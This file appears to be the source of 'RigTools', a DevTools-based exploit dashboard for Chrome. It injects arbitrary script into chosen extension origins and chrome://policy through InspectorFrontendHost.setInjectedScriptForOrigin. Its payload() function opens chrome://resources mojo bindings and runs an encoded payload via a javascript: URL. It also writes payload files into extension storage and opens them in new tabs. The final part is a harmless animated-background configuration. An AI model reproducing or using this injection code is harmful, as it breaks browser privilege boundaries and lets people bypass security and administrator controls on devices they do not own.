document.title = "Dashboard - Rigtools";
let particles = html`<div id="particles-js"></div>`;

let root = html`
<div>
    <h1>RigTools (completely refactored edition)</h1>
    <div class="grid">
        <div>
            <input type="text" class="txtinput" placeholder="Extension ID" id="extID"/>
        </div>
        <div>
            <button class="btn" type="button" id="evalPayloadExt">
                Run Payload
            </button>
        </div>
        <div>Devtools Context</div>
        <div>
            <button class="btn" type="button" id="evalScriptDevtools">
                Evaluate Script
            </button>
        </div>
        <div class="script-area">
            <textarea id="script" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></textarea>
        </div>
    </div>
</div>
`;
root.classList.add("main");

document.body.appendChild(particles);
document.body.appendChild(root);
let css = document.createElement("style");
css.textContent = atob("%%ENTRYCSS%%");
document.head.appendChild(css);

function payload() {
    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
    if (!(location.origin.includes("chrome-extension://" + pdfId))) return handleNonPDF();
    chrome.tabs.getCurrent(function (_info) {
        chrome.windows.create({
            setSelfAsOpener: true,
            url: mojoURL
        }, function (win) {
            const r = win.tabs[0].id;
            chrome.tabs.executeScript(r, { code: `location.href = "javascript:${atob('%%CHROMEPAYLOAD%%')}"` });
        })
    })

    function removeFile(fs, file) {
        return new Promise(function (resolve, _reject) {
            fs.root.getFile(file, { create: true }, function (entry) {
                entry.remove(resolve);
            })
        });
    }
    function writeFile(fs, file, data) {
        return new Promise((resolve, _reject) => {
            removeFile(fs, file).then(() => writeFileInner(fs, file, data, resolve))
        })
    }

    function writeFileInner(fs, file, data, resolve) {
        fs.root.getFile(file, { create: true }, function (entry) {
            entry.createWriter(function (writer) {
                writer.write(new Blob([data]));
                resolve(entry.toURL());
            });
        });
    }

    function handleNonPDF(isCleanup) {
        w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, (fs) => handleFS(fs, isCleanup));
    }
    async function handleFS(fs, isCleanup) {
        if (isCleanup) {
            console.log("cleaning up");
            debugger;
            await removeFile(fs, 'index.js');
            await removeFile(fs, 'index.html');
            alert("Cleaned up successfully!");
            cleanup();
            w.close();
            return;
        }
        
        await Promise.all([writeFile(fs, 'dreamland.js', atob("%%DREAMLANDJS%%")),
        writeFile(fs, 'index.js', `async function run() {\n${atob("%%CHROMEPAYLOAD%%")}\n}\nrun()`),
        writeFile(fs, 'index.css', atob("%%CHROMEPAYLOADCSS%%"))]);
        const url = await writeFile(fs, 'index.html', `<!Doctype html><html><head><script src="./dreamland.js"></script><script defer src="./index.js"></script><link rel="stylesheet" href="./index.css"></head><body></body></html>`);
        w.chrome.tabs.create({ url });
        w.close();
        cleanup();
    }
}
            
let globalMap = [];

document.getElementById("evalScriptDevtools").addEventListener("click", function () {
    try {
        eval(document.getElementById("script").value);
    } catch (err) {
        console.log("Error while executing script: ");
        console.error(err);
        alert(`Error while executing script: ${err}`);
    }
})

document.getElementById("evalPayloadExt").addEventListener("click", function () {
    let path = document.getElementById("path")?.value ?? "manifest.json";
    let injected = payload;
    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
    let x = document.getElementById("extID").value;
    if (x === pdfId) {
        path = "index.html";
        alert("No payload availible for PDF reader, running script in textbox instead");
        let script = document.getElementById("script").value;
        injected = injected.toString().replace('%%CHROMEPAYLOAD%%', btoa(script));
        InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', script + '//');
    }
    const url = `chrome-extension://${x ?? alert("NOTREACHED")}/${path}`;
    InspectorFrontendHost.setInjectedScriptForOrigin(new URL(url).origin,
        `window.cleanup = () => {
            window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');
        };
        window.onmessage = function (data) {
            window.sys = data.data;
            const w = open(origin + '/${path}');
            w.onload = function () {(${injected.toString()})(w, data.data)}
        };`
    );
    const iframe = document.createElement("iframe");
    iframe.src = url;

    const iframeID = globalMap.push(iframe) - 1;
    document.body.appendChild(iframe);
    iframe.idx = iframeID;
    iframe.onload = function () {
        iframe.contentWindow.postMessage({
            type: "uidpass",
            passcode: iframeID,
            cleanup: false
        }, '*');
    };
});

loadRemoteScript(document, window, "https://raw.githubusercontent.com/VincentGarreau/particles.js/d01286d6dcd61f497d07cc62bd48e692f6508ad5/particles.min.js").then(() => particlesJS('particles-js', {
    "particles": {
        "number": {
            "value": 80,
            "density": {
                "enable": true,
                "value_area": 800
            }
        },
        "color": {
            "value": "#ffffff"
        },
        "shape": {
            "type": "circle",
            "stroke": {
                "width": 0,
                "color": "#000000"
            },
            "polygon": {
                "nb_sides": 5
            },
        },
        "opacity": {
            "value": 0.5,
            "random": false,
            "anim": {
                "enable": false,
                "speed": 1,
                "opacity_min": 0.1,
                "sync": false
            }
        },
        "size": {
            "value": 5,
            "random": true,
            "anim": {
                "enable": false,
                "speed": 40,
                "size_min": 0.1,
                "sync": false
            }
        },
        "line_linked": {
            "enable": true,
            "distance": 150,
            "color": "#ffffff",
            "opacity": 0.4,
            "width": 1
        },
        "move": {
            "enable": true,
            "speed": 6,
            "direction": "none",
            "random": false,
            "straight": false,
            "out_mode": "out",
            "bounce": false,
            "attract": {
                "enable": false,
                "rotateX": 600,
                "rotateY": 1200
            }
        }
    },
    "interactivity": {
        "detect_on": "canvas",
        "events": {
            "onhover": {
                "enable": true,
                "mode": "repulse"
            },
            "onclick": {
                "enable": true,
                "mode": "push"
            },
            "resize": true
        },
        "modes": {
            "grab": {
                "distance": 400,
                "line_linked": {
                    "opacity": 1
                }
            },
            "bubble": {
                "distance": 400,
                "size": 40,
                "duration": 2,
                "opacity": 8,
                "speed": 3
            },
            "repulse": {
                "distance": 200,
                "duration": 0.4
            },
            "push": {
                "particles_nb": 4
            },
            "remove": {
                "particles_nb": 2
            }
        }
    },
    "retina_detect": true
}));